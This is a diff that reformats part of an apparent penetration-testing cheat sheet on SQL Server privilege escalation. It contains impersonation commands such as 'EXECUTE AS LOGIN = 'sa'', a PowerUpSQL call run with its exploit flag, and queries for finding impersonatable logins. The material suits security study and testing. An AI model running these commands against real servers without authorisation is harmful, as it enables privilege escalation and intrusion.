@@ -2,20 +2,20 @@
 
 ## Summary
 
-* [Find and exploit impersonation opportunities ](#find-and-exploit-impersonation-opportunities)
+* [Find and exploit impersonation opportunities](#find-and-exploit-impersonation-opportunities)
 * [Find SQL Server Logins Which can be Impersonated for the Current Database](#find-sql-server-logins-which-can-be-impersonated-for-the-current-database)
 * [Find databases that have been configured as trustworthy](#find-databases-that-have-been-configured-as-trustworthy)
-
 
 ## Find and exploit impersonation opportunities
 
 * Impersonate as: `EXECUTE AS LOGIN = 'sa'`
 * Impersonate `dbo` with DB_OWNER
-	```sql
-	SQL> select is_member('db_owner');
-	SQL> execute as user = 'dbo'
-	SQL> SELECT is_srvrolemember('sysadmin')
-	```
+
+ ```sql
+ SQL> select is_member('db_owner');
+ SQL> execute as user = 'dbo'
+ SQL> SELECT is_srvrolemember('sysadmin')
+ ```
 
 ```ps1
 Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose
@@ -48,7 +48,6 @@ SELECT ORIGINAL_LOGIN()
 SELECT SYSTEM_USER
 ```
 
-
 ## Find SQL Server Logins Which can be Impersonated for the Current Database
 
 ```sql
@@ -58,7 +57,6 @@ inner join sys.server_principals b
 on a.grantor_principal_id = b.principal_id
 where a.permission_name = 'impersonate'
 ```
-
 
 ## Find databases that have been configured as trustworthy
 
